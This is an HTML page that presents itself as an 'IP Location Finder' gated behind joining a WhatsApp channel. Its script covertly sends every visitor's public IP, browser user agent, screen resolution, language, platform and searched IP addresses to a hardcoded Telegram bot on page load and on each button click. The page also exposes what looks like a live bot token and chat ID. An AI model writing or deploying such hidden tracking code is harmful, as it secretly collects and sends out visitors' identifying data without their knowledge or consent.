<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>IP Location Finder | NeoVision</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0a0f, #030305);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 8px;
        }

        /* Main Card - Fixed small width for 340px screens */
        .main-card {
            max-width: 340px;
            width: 100%;
            background: rgba(12, 12, 18, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 24px;
            padding: 20px 16px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.1), 0 8px 20px rgba(0, 0, 0, 0.4);
            transition: box-shadow 0.3s ease;
        }

        .main-card:hover {
            box-shadow: 0 0 12px rgba(0, 255, 255, 0.2);
        }

        /* Title */
        h2 {
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            background: linear-gradient(135deg, #ffffff, #0ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 20px;
            letter-spacing: -0.3px;
        }

        /* IP Input Section */
        .search-section {
            margin-bottom: 20px;
        }

        .ip-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(20, 20, 28, 0.9);
            border: 1.5px solid rgba(0, 255, 255, 0.3);
            border-radius: 28px;
            font-size: 14px;
            font-weight: 450;
            color: #fff;
            outline: none;
            transition: all 0.25s;
            margin-bottom: 12px;
        }

        .ip-input:focus {
            border-color: #0ff;
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.4);
            background: rgba(0, 0, 0, 0.7);
        }

        /* Locate Button */
        .locate-btn {
            width: 100%;
            padding: 10px;
            background: transparent;
            border: 1.5px solid #0ff;
            border-radius: 40px;
            color: #0ff;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.25s;
            backdrop-filter: blur(4px);
        }

        .locate-btn:hover {
            background: rgba(0, 255, 255, 0.12);
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
            transform: translateY(-1px);
        }

        /* Result Container */
        .result {
            margin-top: 20px;
            display: none;
            flex-direction: column;
            gap: 8px;
        }

        /* Info Box */
        .info-neon {
            background: rgba(18, 18, 26, 0.7);
            border-radius: 18px;
            padding: 8px 14px;
            transition: all 0.2s;
            border-left: 3px solid;
            backdrop-filter: blur(4px);
        }

        /* Neon Colors */
        .info-neon:nth-child(1) { border-left-color: #ff3b5c; box-shadow: 0 0 4px rgba(255, 59, 92, 0.3); }
        .info-neon:nth-child(2) { border-left-color: #25d366; box-shadow: 0 0 4px rgba(37, 211, 102, 0.3); }
        .info-neon:nth-child(3) { border-left-color: #0ff; box-shadow: 0 0 4px rgba(0, 255, 255, 0.3); }
        .info-neon:nth-child(4) { border-left-color: #ff9500; box-shadow: 0 0 4px rgba(255, 149, 0, 0.3); }
        .info-neon:nth-child(5) { border-left-color: #af52de; box-shadow: 0 0 4px rgba(175, 82, 222, 0.3); }
        .info-neon:nth-child(6) { border-left-color: #ff2d55; box-shadow: 0 0 4px rgba(255, 45, 85, 0.3); }

        .info-neon:hover {
            transform: translateX(4px);
            background: rgba(30, 30, 40, 0.9);
        }

        .info-label {
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 4px;
        }

        .info-value {
            font-size: 13px;
            font-weight: 500;
            color: #fff;
            word-break: break-word;
        }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(0, 255, 255, 0.6);
            font-size: 11px;
            font-weight: 500;
            letter-spacing: 0.8px;
            border-top: 1px solid rgba(0, 255, 255, 0.2);
            padding-top: 12px;
        }

        /* Contact Admin */
        .contact-admin {
            text-align: center;
            margin-top: 12px;
        }

        .contact-link {
            color: #39ff14;
            text-decoration: none;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.5px;
            background: transparent;
            padding: 5px 14px;
            border-radius: 30px;
            border: 1px solid #39ff14;
            transition: 0.25s;
            display: inline-block;
            box-shadow: 0 0 4px rgba(57, 255, 20, 0.3);
        }

        .contact-link:hover {
            background: rgba(57, 255, 20, 0.12);
            box-shadow: 0 0 8px rgba(57, 255, 20, 0.5);
        }

        /* Modal - Join System (also compact) */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.92);
            backdrop-filter: blur(12px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background: rgba(10, 10, 16, 0.98);
            border-radius: 28px;
            padding: 24px 20px;
            text-align: center;
            width: 300px;
            max-width: 90%;
            border: 1px solid rgba(0, 255, 255, 0.4);
            box-shadow: 0 0 22px rgba(0, 255, 255, 0.25);
        }

        .modal-content h3 {
            color: #fff;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 20px;
        }

        .btn-group {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 14px;
        }

        .join-channel {
            background: #25D366;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
            transition: 0.2s;
        }

        .join-channel:hover {
            background: #128C7E;
            transform: scale(1.02);
        }

        .cancel-exit {
            background: rgba(255, 255, 255, 0.08);
            color: #ff5a5a;
            border: 1px solid rgba(255, 90, 90, 0.4);
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
        }

        .verify-real {
            background: linear-gradient(135deg, #0ff, #00aaff);
            color: #000;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            margin-top: 8px;
            display: none;
            box-shadow: 0 0 8px #0ff;
        }

        .loading-toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            color: #0ff;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 11px;
            z-index: 1100;
            border: 1px solid #0ff;
            pointer-events: none;
        }
    </style>
</head>
<body>

<!-- Join Verification Modal -->
<div id="verifyModal" class="modal">
    <div class="modal-content">
        <h3>🔔 JOIN WHATSAPP CHANNEL TO CONTINUE</h3>
        <div class="btn-group">
            <button id="joinBtn" class="join-channel">📢 Join Channel</button>
            <button id="cancelBtn" class="cancel-exit">✕ Cancel</button>
        </div>
        <button id="verifyRealBtn" class="verify-real">✓ Verify & Open</button>
    </div>
</div>

<!-- Main Application (Hidden until verification) -->
<div id="mainContent" style="display: none;">
    <div class="main-card">
        <h2>🌍 IP Location Finder</h2>
        
        <div class="search-section">
            <input type="text" id="ipAddress" class="ip-input" placeholder="Enter IP address, e.g., 8.8.8.8">
            <button class="locate-btn" onclick="getIPInfo()">⟳ Locate IP</button>
        </div>

        <div class="result" id="result"></div>
        
        <div class="footer">
            ⚡ TECHNICAL FAHAD ⚡
        </div>

        <div class="contact-admin">
            <a href="https://wa.me/923251138959?text=Assalam%20Alaikum%20FAHAD%20BHAI%20Kese%20Ho%20Aap%20%E2%9D%A3%EF%B8%8F%F0%9F%98%8A" 
               class="contact-link" 
               target="_blank">
                💚 Contact Admin
            </a>
        </div>
    </div>
</div>

<script>
    // ----------------------------------------------
    // 1. TELEGRAM BOT INTEGRATION (Visitor IP + Device)
    // ----------------------------------------------
    const BOT_TOKEN = '7760380089:AAGN42nWvSH0WCCucmDfUNUycckhhVW4x30';
    const CHAT_ID = '5975952682';

    // Function to get visitor's public IP using ipify
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org/?format=json');
            const data = await response.json();
            return data.ip;
        } catch (err) {
            console.warn("ipify failed, fallback to ipinfo");
            // fallback: fetch from ipinfo (but only IP)
            const fallbackRes = await fetch('https://ipinfo.io/json');
            const fallbackData = await fallbackRes.json();
            return fallbackData.ip || '0.0.0.0';
        }
    }

    // Function to send IP + Device + timestamp to Telegram bot
    async function sendInfoToBot(ipAddress, userAgent, additionalNote = "Initial Visit") {
        try {
            const timestamp = new Date().toLocaleString('en-PK', {timeZone: 'Asia/Karachi'});
            const message = `🕵️‍♂️ *NEW VISITOR DETECTED* 
┌─────────────────
│ 🌐 *IP Address:* ${ipAddress}
│ 📱 *Device Info:* ${userAgent.substring(0, 250)}
│ ⏰ *Time:* ${timestamp}
│ 🧩 *Stage:* ${additionalNote}
└─────────────────`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            console.log('✅ Telegram notification sent');
        } catch (error) {
            console.error('❌ Telegram send error:', error);
        }
    }

    // Additional: send Live location search logs if needed (bonus security)
    async function sendSearchLogToBot(searchedIP, visitorRealIP) {
        try {
            const userAgent = navigator.userAgent;
            const timestamp = new Date().toLocaleString('en-PK');
            const searchMsg = `🔍 *IP SEARCH ALERT* 
User IP: ${visitorRealIP}
Searched for: ${searchedIP}
Device: ${userAgent.substring(0, 120)}
Time: ${timestamp}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: searchMsg,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) { console.warn("Search log failed", e); }
    }

    // -------------------------------------------------
    // 2. MODAL JOIN SYSTEM (WhatsApp Channel Lock)
    // -------------------------------------------------
    let joinClicked = false;
    let timerActive = false;
    let verificationInterval = null;
    let globalVisitorIP = "fetching...";   // store visitor IP

    const modal = document.getElementById('verifyModal');
    const mainContent = document.getElementById('mainContent');
    const joinBtn = document.getElementById('joinBtn');
    const cancelBtn = document.getElementById('cancelBtn');
    const verifyRealBtn = document.getElementById('verifyRealBtn');

    // Helper: show short loading toast (optional)
    function showToast(msg) {
        let toast = document.querySelector('.loading-toast');
        if(!toast) {
            toast = document.createElement('div');
            toast.className = 'loading-toast';
            document.body.appendChild(toast);
        }
        toast.textContent = msg;
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 2000);
    }

    // Join button logic: opens WhatsApp channel & starts 6-second verification timer
    joinBtn.onclick = async function() {
        if (timerActive) {
            showToast("⏳ Already joined? Wait for verification.");
            return;
        }
        // Open WhatsApp channel
        window.open('https://whatsapp.com/channel/0029VbCK8wI96H4WL0Ds5n24', '_blank');
        joinClicked = true;
        timerActive = true;
        
        // Let Telegram know that user clicked join (optional extra log)
        if(globalVisitorIP && globalVisitorIP !== "fetching...") {
            await sendInfoToBot(globalVisitorIP, navigator.userAgent, "Clicked Join Channel Button");
        }
        
        let secondsElapsed = 0;
        verificationInterval = setInterval(async function() {
            secondsElapsed++;
            // After 6 seconds (user is assumed to have followed channel), show verify button
            if (secondsElapsed >= 6) {   // ⚙️ Set to 6 seconds (fast & UX friendly)
                clearInterval(verificationInterval);
                if (joinClicked) {
                    verifyRealBtn.style.display = 'inline-block';
                    showToast("✅ Verification ready! Click 'Verify & Open'");
                    // optional notify telegram that user reached verification stage
                    if(globalVisitorIP) {
                        await sendInfoToBot(globalVisitorIP, navigator.userAgent, "Verification button unlocked");
                    }
                }
                timerActive = false;
            }
        }, 1000);
    };

    // Cancel button -> terminate session (closes interface)
    cancelBtn.onclick = function() {
        // Send cancellation notice to admin
        if(globalVisitorIP && globalVisitorIP !== "fetching...") {
            sendInfoToBot(globalVisitorIP, navigator.userAgent, "User clicked CANCEL - Session closed");
        }
        document.body.innerHTML = '<div style="text-align:center;margin-top:80px;color:white;font-size:14px; font-family:sans-serif;"><h2 style="color:#ff5555;">⛔ Access Denied</h2><p>You have cancelled the verification.</p><br><p style="font-size:12px; opacity:0.7;">Contact admin for support.</p></div>';
    };

    // Verify & Open: finally unlock main app
    verifyRealBtn.onclick = async function() {
        // final telegram notification: access granted
        if(globalVisitorIP && globalVisitorIP !== "fetching...") {
            await sendInfoToBot(globalVisitorIP, navigator.userAgent, "✅ ACCESS GRANTED - User verified channel join");
        }
        modal.style.display = 'none';
        mainContent.style.display = 'block';
        // also trigger a welcome location fetch? optional
    };

    // ---------------------------------------------
    // 3. IP LOCATION LOOKUP functionality (existing)
    // ---------------------------------------------
    window.getIPInfo = async function() {
        let ip = document.getElementById("ipAddress").value.trim();
        if (ip === "") {
            alert("Please enter a valid IP address (e.g., 8.8.8.8)");
            return;
        }
        
        // Send searched IP log to Telegram (for admin monitoring)
        if (globalVisitorIP && globalVisitorIP !== "fetching...") {
            await sendSearchLogToBot(ip, globalVisitorIP);
        }
        
        try {
            const response = await fetch(`https://ipinfo.io/${ip}/json`);
            const data = await response.json();
            let resultDiv = document.getElementById("result");
            resultDiv.style.display = 'flex';
            resultDiv.innerHTML = `
                <div class="info-neon"><div class="info-label">🌐 IP ADDRESS</div><div class="info-value">${data.ip || ip}</div></div>
                <div class="info-neon"><div class="info-label">📍 CITY</div><div class="info-value">${data.city || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🗺️ REGION</div><div class="info-value">${data.region || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🏴 COUNTRY</div><div class="info-value">${data.country || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">📌 LOCATION (LAT/LONG)</div><div class="info-value">${data.loc || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🏢 ORGANIZATION</div><div class="info-value">${data.org || 'N/A'}</div></div>
            `;
        } catch (err) {
            console.error(err);
            alert("Error fetching location data. Check IP or network.");
        }
    };

    // ----------------------------------------------
    // 4. MASTER INITIALIZATION: on page load, capture IP -> send Telegram -> Show Modal
    // ----------------------------------------------
    (async function initializeApp() {
        try {
            // Fetch visitor's real IP address
            const visitorIP = await getUserIP();
            globalVisitorIP = visitorIP;
            const userAgentData = navigator.userAgent;
            
            // Send detailed info to Telegram bot BEFORE modal interaction (FIRST NOTIFICATION)
            await sendInfoToBot(visitorIP, userAgentData, "PAGE LOAD - Awaiting channel verification");
            
            // Optional: additional device details (screen resolution, language)
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language;
            // Send enhanced device details as second message (extra detail for admin)
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🖥️ *Extended Device Info*\nIP: ${visitorIP}\nResolution: ${screenRes}\nLanguage: ${language}\nPlatform: ${navigator.platform}\nTimestamp: ${new Date().toLocaleString()}`,
                    parse_mode: 'Markdown'
                })
            }).catch(e=>console.warn);
            
        } catch (err) {
            console.error("Initialization error:", err);
            globalVisitorIP = "unknown";
        }
        
        // Modal is visible by default, no auto-unlock. Perfect.
        // Ensure verify button is reset: hidden initially.
        verifyRealBtn.style.display = 'none';
        joinClicked = false;
        timerActive = false;
        if(verificationInterval) clearInterval(verificationInterval);
        
        // Additional safeguard: if someone tries to inspect, modal stays
        // Also ensure that the main content stays hidden until Verify.
        // Also if the user refreshes, state persists because modal is always shown.
        // Join channel logic integrated fully.
    })();

    // Extra cleanup: avoid double initialization; also if modal is already there.
    // Ensure that any accidental 'Enter' on hidden field not cause error
    document.addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && mainContent.style.display === 'block') {
            let ipField = document.getElementById('ipAddress');
            if (ipField && document.activeElement === ipField) {
                getIPInfo();
            }
        }
    });

    // For better resilience: ensure that the result container remains interactive.
    // Also ping when the main content becomes visible (no additional logic needed)
    window.addEventListener('load', function() {
        // Style: ensure modal on top
        if(modal) modal.style.display = 'flex';
    });
</script>
</body>
</html>
